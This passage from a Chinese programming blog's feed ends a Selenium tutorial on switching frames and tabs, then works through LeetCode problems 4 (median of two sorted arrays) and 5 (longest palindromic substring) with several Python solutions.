class="hljs-string">"frame1"</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"frame2"</span> / &gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>我们先从主文档一层一层的切到frame2<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">driver.switch_to.frame(<span class="hljs-string">"frame1"</span>)</span><br><span class="line">driver.switch_to.frame(<span class="hljs-string">"frame2"</span>)</span><br></pre></td></tr></table></figure><br>现在我们从frame2怎么切换到frame1呢？<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">driver.switch_to.parent_frame()  <span class="hljs-comment"># 如果当前已是主文档，则无效果</span></span><br></pre></td></tr></table></figure><br>有了这个方法，相当于后退作用，我们就可以随意的在frame之间切换了。</p>
<h3 id="三、其他常用函数补充"><a href="#三、其他常用函数补充" class="headerlink" title="三、其他常用函数补充"></a>三、其他常用函数补充</h3><h4 id="切换标签页"><a href="#切换标签页" class="headerlink" title="切换标签页:"></a>切换标签页:</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">window = self.browser.window_handles <span class="hljs-comment"># 获得当前窗口句柄集合（列表类型）</span></span><br><span class="line">browser.switch_to.window(window[<span class="hljs-number">1</span>]) <span class="hljs-comment">#切换到第二个标签</span></span><br></pre></td></tr></table></figure></p>
<h4 id="控制浏览器前进、后退、刷新"><a href="#控制浏览器前进、后退、刷新" class="headerlink" title="控制浏览器前进、后退、刷新"></a>控制浏览器前进、后退、刷新</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">browser.forward()</span><br><span class="line">browser.back()</span><br><span class="line">browser.refresh()</span><br></pre></td></tr></table></figure></p>
<h4 id="关闭浏览器"><a href="#关闭浏览器" class="headerlink" title="关闭浏览器"></a>关闭浏览器</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">browser.quit()</span><br></pre></td></tr></table></figure></p>
<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>如果你想获取完整的爬取知网作者知网节的代码:<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/aestheticisma/spider_cnki</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>爬虫系列</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode DAY 2 (4)</title>
    <url>/2019/11/14/leetcode-day2/</url>
    <content><![CDATA[<p>LeetCode系列 昨天只做了一道题 失败的一天<a id="more"></a><br>但每天的总结不能停啊…</p>
<h3 id="4-寻找两个有序数组的中位数（困难）"><a href="#4-寻找两个有序数组的中位数（困难）" class="headerlink" title="4. 寻找两个有序数组的中位数（困难）"></a>4. 寻找两个有序数组的中位数（困难）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定两个大小为m和n的有序数组nums1和nums2。<br>请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为O(log(m + n))。<br>你可以假设nums1和nums2不会同时为空。</p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nums1 = [1, 3]</span><br><span class="line">nums2 = [2]</span><br><span class="line"></span><br><span class="line">则中位数是 2.0</span><br></pre></td></tr></table></figure></p>
<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nums1 = [1, 2]</span><br><span class="line">nums2 = [3, 4]</span><br><span class="line"></span><br><span class="line">则中位数是 (2 + 3)/2 = 2.5</span><br></pre></td></tr></table></figure></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1-定义第三个数组重排序"><a href="#解法1-定义第三个数组重排序" class="headerlink" title="解法1: 定义第三个数组重排序"></a>解法1: 定义第三个数组重排序</h5><p>一开始看到这道题很自然的想到再多定义一个列表数组将两个数组重排序，但是像python里的sort方法就不用了，这样就没意思了。具体代码如下。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment">#时间复杂度O(m+n)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        nums3 = []</span><br><span class="line">        mid = (len(nums1)+len(nums2))//<span class="hljs-number">2</span></span><br><span class="line">        flag = (len(nums1)+len(nums2))%<span class="hljs-number">2</span></span><br><span class="line">        i, j= <span class="hljs-number">0</span>, <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">while</span>(i&lt;len(nums1) <span class="hljs-keyword">and</span> j&lt;len(nums2)):</span><br><span class="line">            <span class="hljs-keyword">if</span> nums1[i]&gt;nums2[j]:</span><br><span class="line">                nums3.append(nums2[j])</span><br><span class="line">                j+=<span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                nums3.append(nums1[i])</span><br><span class="line">                i+=<span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">while</span>(i&lt;len(nums1)):</span><br><span class="line">            nums3.append(nums1[i])</span><br><span class="line">            i+=<span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">while</span>(j&lt;len(nums2)):</span><br><span class="line">            nums3.append(nums2[j])</span><br><span class="line">            j+=<span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">1</span>):</span><br><span class="line">            <span class="hljs-keyword">return</span> nums3[mid]</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> (nums3[mid<span class="hljs-number">-1</span>]+nums3[mid])/<span class="hljs-number">2</span></span><br></pre></td></tr></table></figure><br>但是题目的要求时间复杂度为$O(log(m+n))$，虽然提交成功了，但我们需要降低时间复杂度啊…一看到log，那肯定是要用到二分法啊，看了评论区大佬的解答，还有下面两种解法。</p>
<h5 id="解法2：取第k小的数"><a href="#解法2：取第k小的数" class="headerlink" title="解法2：取第k小的数"></a>解法2：取第k小的数</h5><p>所谓取中位数，那么不就是取第k小的数吗，如果是奇数，那就是取最中间那个数，也就是<code>k = (m+n+1)/2</code>，如果是偶数，那就是取<code>k1 = (m+n+1)/2</code>和<code>k2 =（m+n+2)/2</code>位置数的平均值。<br>这里可以用到一个小trick，因为当数组维数是奇数的时候，(m+n+1)是偶数，我们进行的又是模2运算，因此变成<code>k = (m+n+2)/2</code>和原来是相等的，这样也变成和偶数时一样的k1和k2，就可以不用分情况讨论了。<br>所以接下来我们所要求的就是第k1小的和第k2小的数，然后二者相加除以二就是我们最终的答案了。<br>那接下来问题就转化为如何在两个数组中求第k小的数，题目要求中时间复杂度要为$O(log(m+n))$，因此我们要用到二分法，也就是说，我们可以在两个数组中分别取前<code>k/2</code>个数（因为是有序数组嘛，前<code>k/2</code>也就是<code>k/2</code>个较小的，降序反之亦然），比较取出的这两组数据的最后一位哪个更小，我们便去掉该<code>k/2</code>个，如果相等就随便去掉那一组都可以。但是还有一个问题：当某一组数不够<code>k/2</code>的时候，那就将其最后一个数与另一组第<code>k/2</code>个比较，如果这组数都被淘汰了，那就剩一组数据了，在一组数据中取第k小的数就可以直接return了。因此在取<code>k/2</code>之前我们还要判断数组的数量够不够。之后进行递归，因为去掉了<code>k/2</code>个数，因此下一轮的<code>k = k - k/2</code>，直到当<code>k = 1</code>时，递归结束，这时候每组数据都取了一个，<code>k = 1</code>的意思不就是取最小的数嘛，所以只要比较这两个数哪一个更小，哪一个就是答案。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment">#O(log(m+n))</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        m = len(nums1)</span><br><span class="line">        n = len(nums2)</span><br><span class="line">        left = (m+n+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span></span><br><span class="line">        right = (m+n+<span class="hljs-number">2</span>)//<span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-keyword">return</span> (self.findKth(nums1, nums2, left) + self.findKth(nums1, nums2, right))/<span class="hljs-number">2</span></span><br><span class="line">    <span class="hljs-comment"># 取第k小的数</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findKth</span><span class="hljs-params">(self, nums1, nums2, k)</span>:</span></span><br><span class="line">    	<span class="hljs-comment"># 注意判断列表为空时不能用 nums1 == None</span></span><br><span class="line">    	<span class="hljs-comment"># 因为取第k小的数一定有答案，因此不存在两个数组都为空的情况</span></span><br><span class="line">        <span class="hljs-keyword">if</span> len(nums1) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> nums2[k<span class="hljs-number">-1</span>]</span><br><span class="line">        <span class="hljs-keyword">if</span> len(nums2) == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> nums1[k<span class="hljs-number">-1</span>]</span><br><span class="line">        <span class="hljs-comment"># 正常的递归结束出口</span></span><br><span class="line">        <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> min(nums1[k<span class="hljs-number">-1</span>], nums2[k<span class="hljs-number">-1</span>])</span><br><span class="line">        <span class="hljs-comment"># k!=1，进行递归，可以利用列表的切片功能轻松返回剩余数组</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            n = k//<span class="hljs-number">2</span></span><br><span class="line">            <span class="hljs-keyword">if</span> n &gt; len(nums1):</span><br><span class="line">                <span class="hljs-keyword">if</span> nums1[<span class="hljs-number">-1</span>] &lt; nums2[n<span class="hljs-number">-1</span>]:</span><br><span class="line">                    <span class="hljs-keyword">return</span> self.findKth([], nums2, k-len(nums1))</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    <span class="hljs-keyword">return</span> self.findKth(nums1, nums2[n:], k-n)</span><br><span class="line">            <span class="hljs-keyword">if</span> n &gt; len(nums2):</span><br><span class="line">                <span class="hljs-keyword">if</span> nums2[<span class="hljs-number">-1</span>] &lt; nums1[n<span class="hljs-number">-1</span>]:</span><br><span class="line">                    <span class="hljs-keyword">return</span> self.findKth(nums1, [], k-len(nums2))</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    <span class="hljs-keyword">return</span> self.findKth(nums1[n:], nums2, k-n)</span><br><span class="line">            <span class="hljs-keyword">if</span> nums1[n<span class="hljs-number">-1</span>] &lt; nums2[n<span class="hljs-number">-1</span>]:</span><br><span class="line">                <span class="hljs-keyword">return</span> self.findKth(nums1[n:], nums2, k-n)</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                <span class="hljs-keyword">return</span> self.findKth(nums1, nums2[n:], k-n)</span><br></pre></td></tr></table></figure></p>
<h5 id="解法3-从中位数的定义出发"><a href="#解法3-从中位数的定义出发" class="headerlink" title="解法3: 从中位数的定义出发"></a>解法3: 从中位数的定义出发</h5><p>解析主要参考<code>LeetCode</code>用户<code>windliang</code>的题解。</p>
<p>因为中位数的定义是一个可以将数值集合划分为相等的上下两部分的一个数值，因此我们可以考虑对题中给的两个数组进行划分，划分成左右两个部分，如下图所示：<br><img src="/2019/11/14/leetcode-day2/1.jpg" alt="1.jpg"><br>当我们用i和j把A、B数组划分为这样的两个部分，如果满足下列条件：</p>
<ul>
<li><code>A_left + B_left == A_right + B_right</code> (如果<code>len(A)+len(B)</code>为奇数，就让左半部分比又半部分多一个，这样中位数就是左半部分最后一个值)</li>
<li><code>max(A_left[i-1], B_left[j-1]) &lt; min(A_right[i], B_right[j])</code></li>
</ul>
<p>那么我们就可以得到中位数的答案：</p>
<ul>
<li>如果<code>len(A)+len(B)</code>为奇数，<code>ans = max(A_left[i-1], B_left[j-1])</code></li>
<li>如果<code>len(A)+len(B)</code>为偶数，<code>ans = (max(A_left[i-1], B_left[j-1]) + min(A_right[i], B_right[j])) / 2</code></li>
</ul>
<p>对第一个条件，要使他们划分成这样的两个部分，那么i和j具体值应该取多少呢？<br>为了降低时间复杂度，i的取值可以用二分法，而j又与i有直接关系，假设<code>len(A) = m</code>,<code>len(B) = n</code>,<code>(m+n)%2 == 0</code><br>因为<code>i + j = m - i + n - j</code><br>故<code>j = (m + n)/2 - i</code><br>当<code>(m+n)%2 == 1</code>时，有<code>i + j = m - i + n - j + 1</code>，故<code>j = (m + n + 1)/2 - i</code></p>
<p>由于当<code>(m+n)%2 == 0</code>时，模2和加1之后再模2的值相等，因此j的取值公式可以通用为<br><code>j = (m + n + 1)/2 - i</code><br>当我们把<code>i</code>当作自变量时，<code>0 &lt;= i &lt;= m</code>，为了保证<code>0 &lt;= j &lt;= m</code>，因此我们要使<code>m &lt;= n</code></p>
<p>对于第二个条件，因为题目给的数组是有序的，自然会满足<code>A_left[i-1] &lt; A_right[i]</code>和<code>B_left[j-1] &lt; B_right[j]</code><br>因此我们只要使<code>A_left[i-1] &lt; B_right[j]</code>和<code>B_left[j-1] &lt; A_right[i]</code>就可以满足了第二个条件。<br>当不满足该条件时可以发现有两种情况：</p>
<ul>
<li><code>i &lt; m and j &gt; 0 and B_left[j-1] &gt; A_right[i]</code><br>这时需要增加i，（从上面j的公式可以看出当<code>i&lt;m</code>时，j一定大于0，因此条件可以简化为<code>i &lt; m and B_left[j-1] &gt; A_right[i]</code>）</li>
<li><code>i &gt; 0 and j &lt; n and A_left[i-1] &gt; B_right[j]</code><br>这时需要减小i，（从上面j的公式可以看出当<code>i&gt;0</code>时，j一定小于n，因此条件可以简化为<code>i &gt; 0 and A_left[i-1] &gt; B_right[j]</code>）</li>
</ul>
<p>另外还有两种边界情况（具体可分为4种），即<code>i = 0</code>和<code>i = m</code>，具体可分为<code>i = 0, j != n</code> <code>i = 0, j = n</code> <code>i = m, j = 0</code> <code>i = m, j != 0</code></p>
<p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        m = len(nums1)</span><br><span class="line">        n = len(nums2)</span><br><span class="line">        <span class="hljs-keyword">if</span> m &gt; n: <span class="hljs-comment">#m需要小于等于n</span></span><br><span class="line">            nums1, nums2, m, n = nums2, nums1, n, m</span><br><span class="line">        <span class="hljs-keyword">if</span> m == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> (nums2[(n+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><span class="hljs-number">-1</span>]+nums2[(n+<span class="hljs-number">2</span>)//<span class="hljs-number">2</span><span class="hljs-number">-1</span>])/<span class="hljs-number">2.0</span></span><br><span class="line"></span><br><span class="line">        imin, imax, half_len = <span class="hljs-number">0</span>, m, (m+n+<span class="hljs-number">1</span>) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-comment">#二分法确定i的值</span></span><br><span class="line">        <span class="hljs-keyword">while</span> imin &lt;= imax:</span><br><span class="line">            i = (imin + imax) // <span class="hljs-number">2</span></span><br><span class="line">            j = half_len - i</span><br><span class="line">            <span class="hljs-keyword">if</span> i &lt; m <span class="hljs-keyword">and</span> nums2[j<span class="hljs-number">-1</span>] &gt; nums1[i]:</span><br><span class="line">                imin = i + <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">elif</span> i &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> nums1[i<span class="hljs-number">-1</span>] &gt; nums2[j]:</span><br><span class="line">                imax = i - <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-comment">#达到要求，将边界情况列出分别讨论</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span> :</span><br><span class="line">                    max_of_left = nums2[j<span class="hljs-number">-1</span>]</span><br><span class="line">                    <span class="hljs-keyword">if</span>(j!=n):</span><br><span class="line">                        max_of_right = min(nums1[i], nums2[j])</span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        max_of_right = nums1[i]</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">                <span class="hljs-keyword">elif</span> i==m:</span><br><span class="line">                    <span class="hljs-keyword">if</span>(j!=<span class="hljs-number">0</span>):</span><br><span class="line">                        max_of_left = max(nums1[i<span class="hljs-number">-1</span>], nums2[j<span class="hljs-number">-1</span>])</span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        max_of_left = nums1[i<span class="hljs-number">-1</span>]</span><br><span class="line">                    max_of_right = nums2[j]</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">                <span class="hljs-comment">#一般情况</span></span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    max_of_left = max(nums1[i<span class="hljs-number">-1</span>], nums2[j<span class="hljs-number">-1</span>])</span><br><span class="line">                    max_of_right = min(nums1[i], nums2[j])</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (m+n)%<span class="hljs-number">2</span> == <span class="hljs-number">1</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> max_of_left</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> (max_of_right+max_of_left)/<span class="hljs-number">2.0</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>LeetCode系列</category>
      </categories>
  </entry>
  <entry>
    <title>LeetCode DAY 3 (5)</title>
    <url>/2019/11/16/leetcode-day3/</url>
    <content><![CDATA[<p>这些题都好难啊…越来越觉得自己是个铁fw了…呜呜呜<a id="more"></a></p>
<h3 id="5-最长回文子串（中等）"><a href="#5-最长回文子串（中等）" class="headerlink" title="5. 最长回文子串（中等）"></a>5. 最长回文子串（中等）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个字符串<code>s</code>，找到<code>s</code>中最长的回文子串。你可以假设<code>s</code>的最大长度为<code>1000</code>。</p>
<h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: <span class="hljs-string">"babad"</span></span><br><span class="line">输出: <span class="hljs-string">"bab"</span></span><br><span class="line">注意: <span class="hljs-string">"aba"</span> 也是一个有效答案。</span><br></pre></td></tr></table></figure></p>
<h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h5><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">输入: <span class="hljs-string">"cbbd"</span></span><br><span class="line">输出: <span class="hljs-string">"bb"</span></span><br></pre></td></tr></table></figure></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h5 id="解法1：暴力解法"><a href="#解法1：暴力解法" class="headerlink" title="解法1：暴力解法"></a>解法1：暴力解法</h5><p>作为一个铁fw第一个想到的办法肯定是暴力解决了，lz遍历你所有的子串还不能找出答案？具体做法就是两个for循环遍历所有子串，然后在最内循环里进行判断该子串是不是回文串。<br>因此我们需要定义一个判断是否为回文串的函数，该函数也很暴力，就直接遍历该子串看对应位置的字符是否相同。因此该算法的时间复杂度为$O(n^{3})$<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment">#暴力解法，时间复杂度O(n^3) 空间复杂度O(1)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        max = <span class="hljs-number">0</span></span><br><span class="line">        s_tmp = <span class="hljs-string">''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)):</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(i+<span class="hljs-number">1</span>, len(s)+<span class="hljs-number">1</span>):</span><br><span class="line">                <span class="hljs-keyword">if</span> self.isPalindrome(s[i:j]) <span class="hljs-keyword">and</span> (j-i) &gt; max :</span><br><span class="line">                    s_tmp = s[i:j]</span><br><span class="line">                    max = j-i</span><br><span class="line">        <span class="hljs-keyword">return</span> s_tmp</span><br><span class="line">    <span class="hljs-comment">#判断是否为回文串</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)/<span class="hljs-number">2</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span>(s[i] != s[len(s)-i<span class="hljs-number">-1</span>]):</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br></pre></td></tr></table></figure></p>
<h5 id="解法2：最长公共子串"><a href="#解法2：最长公共子串" class="headerlink" title="解法2：最长公共子串"></a>解法2：最长公共子串</h5><p>还有一种办法就是求最长公共子串，具体做法就是将字符串反转，找出反转前后的公共子串，就是回文串（除一种情况外），比如<code>&#39;abad&#39;</code>，反转之后为<code>&#39;daba&#39;</code>，最长公共子串就是<code>&#39;aba&#39;</code>。<br>但是有一种情况除外，比如<code>&#39;abcdefgdcba&#39;</code>，反转之后为<code>&#39;abcdgfeabcd&#39;</code>，可以看到反转前后的最长公共子串为<code>&#39;abcd&#39;</code>，但它明显不是回文串，这种情况的特征是反转前后字符下标并不一致，因此求出反转前后的最长公共子串后我们需要判断下标是否对应。<br>但现在还有最后两个问题，怎么求最大公共子串以及下标是否对应如何判断。<br>看了大佬们的解析的我恍然大悟……奈何自己太菜…</p>
<ul>
<li><strong>求最长公共子串：</strong><br>我们可以定义一个<strong>二维数组</strong>，可以想象成一个表格，横向代表原字符串序列，纵向代表反转后字符串序列，假设横向坐标用<code>i</code>表示，纵向坐标用<code>j</code>表示。数组用<code>a</code>表示。<br>当<code>s[i] == s_r[j]</code>时，就表示它是<strong>公共</strong>的一个字符，而此时对应的数组元素<code>a[i][j] == a[i-1][j-1] + 1</code>，因为<code>a[i-1][j-1]</code>的位置就是前一个<strong>连续</strong>的公共字符，因此<code>a[i][j]</code>的值就代表最长公共子串的<strong>长度</strong>，而此时的<code>i</code>代表该子串的<strong>结束位置</strong>，有了结束位置我们也就知道了<strong>开始位置</strong>，因此就可以取出该子串。<br>对于上面的计算公式<code>a[i][j] == a[i-1][j-1] + 1</code>，为了保证所有值有意义，我们需要分情况讨论，即当<code>i == 0 or j == 0</code>时进行赋值。该数组可参考下图所示：<br><img src="/2019/11/16/leetcode-day3/1.png" alt="1.png"></li>
<li><strong>判断下标是否对应：</strong><br>我们没有必要将公共子串的下标全部进行判断是否对应，我们只需要判断最后一个字符的下标。比如上图所示，我们将<code>i</code>和<code>j</code>对应公共子串的最后一个字符，现在<code>s_re[j]</code>的位置对应着<code>a</code>，那反转之前这个<code>a</code>的下标为<code>before = len(s)-j-1</code>，之后我们还需要加上公共子串的长度才是末尾字符的下标，因此判断<code>before + a[i][j] - 1 == i</code>，如果相等则为公共子串。</li>
</ul>
<p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment">#时间复杂度O(n^2) 空间复杂度O(n^2)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        s_reverse = s[::<span class="hljs-number">-1</span>]</span><br><span class="line">        max_len = <span class="hljs-number">0</span> <span class="hljs-comment">#最大公共子串长度</span></span><br><span class="line">        max_end = <span class="hljs-number">0</span> <span class="hljs-comment">#最大公共子串结束位置</span></span><br><span class="line">        index = &#123;&#125; <span class="hljs-comment">#构建二维数组 python中只好先定义一个字典</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(s)):</span><br><span class="line">            index[i] = &#123;&#125; <span class="hljs-comment">#通过循环构建二维数组</span></span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)):</span><br><span class="line">                index[i][j] = <span class="hljs-number">0</span> <span class="hljs-comment">#初始化二维数组</span></span><br><span class="line">                <span class="hljs-keyword">if</span> s[i] == s_reverse[j]: </span><br><span class="line">                    <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> j==<span class="hljs-number">0</span>:</span><br><span class="line">                        index[i][j] = <span class="hljs-number">1</span></span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        index[i][j] = index[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>] + <span class="hljs-number">1</span></span><br><span class="line">                <span class="hljs-keyword">if</span> index[i][j] &gt; max_len: </span><br><span class="line">                    before_num = len(s) - <span class="hljs-number">1</span> - j</span><br><span class="line">                    <span class="hljs-comment">#判断是否真的是回文串</span></span><br><span class="line">                    <span class="hljs-keyword">if</span> before_num + index[i][j] - <span class="hljs-number">1</span> == i:</span><br><span class="line">                        max_len = index[i][j]</span><br><span class="line">                        max_end = i</span><br><span class="line">        <span class="hljs-keyword">return</span> s[max_end-max_len+<span class="hljs-number">1</span>:max_end+<span class="hljs-number">1</span>]</span><br></pre></td></tr></table></figure><br>但即使这个复杂度的代码提交还是时间超出限制我哭了，更低复杂度的代码等明天看懂再更……</p>
<h5 id="解法3：暴力破解优化"><a href="#解法3：暴力破解优化" class="headerlink" title="解法3：暴力破解优化"></a>解法3：暴力破解优化</h5><p>在解法一中，我们对每一个子串都进行了判断是不是回文串，但每一次判断都会有$O(n)$的时间复杂度，如果我们能优化掉判断带来的时间复杂度，就可以将总的时间复杂度降为$O(n^{3})$，根据回文串的特点，在$P(i,j)$是回文串的基础上，如果<code>s[i-1] == s[j+1]</code>，那么$P(i-1,j+1)$也是回文串，因此我们将暴力解法中的判断函数改为这种判断方式。但有两种情况需要特殊对待，当子串的个数是1或者2时，此时的<code>i-1</code>和<code>j+1</code>将会将<code>i</code>和<code>j</code>的顺序颠倒产生错误，因此这两种情况需要额外判断。此外，我们需要定义一个数组，用来存储$P(i,j)$是否为回文串的结果。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment">#时间复杂度O(n^2) 空间复杂度O(n^2)</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        arra = [[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s))] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(s))]</span><br><span class="line">        max_len = <span class="hljs-number">0</span></span><br><span class="line">        max_str = <span class="hljs-string">''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> length <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, len(s)+<span class="hljs-number">1</span>):</span><br><span class="line">            <span class="hljs-keyword">for</span> start <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(s)):</span><br><span class="line">                end = start + length - <span class="hljs-number">1</span></span><br><span class="line">                <span class="hljs-keyword">if</span>(end&gt;=len(s)):</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">                <span class="hljs-keyword">if</span> (length==<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> length==<span class="hljs-number">2</span> <span class="hljs-keyword">or</span> arra[start+<span class="hljs-number">1</span>][end<span class="hljs-number">-1</span>]==<span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> s[start] == s[end]:</span><br><span class="line">                    arra[start][end] = <span class="hljs-number">1</span></span><br><span class="line">                    <span class="hljs-keyword">if</span> length &gt; max_len:</span><br><span class="line">                        max_str = s[start:end+<span class="hljs-number">1</span>]</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    arra[start][end] = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">return</span> max_str</span><br></pre></td></tr></table></figure></p>
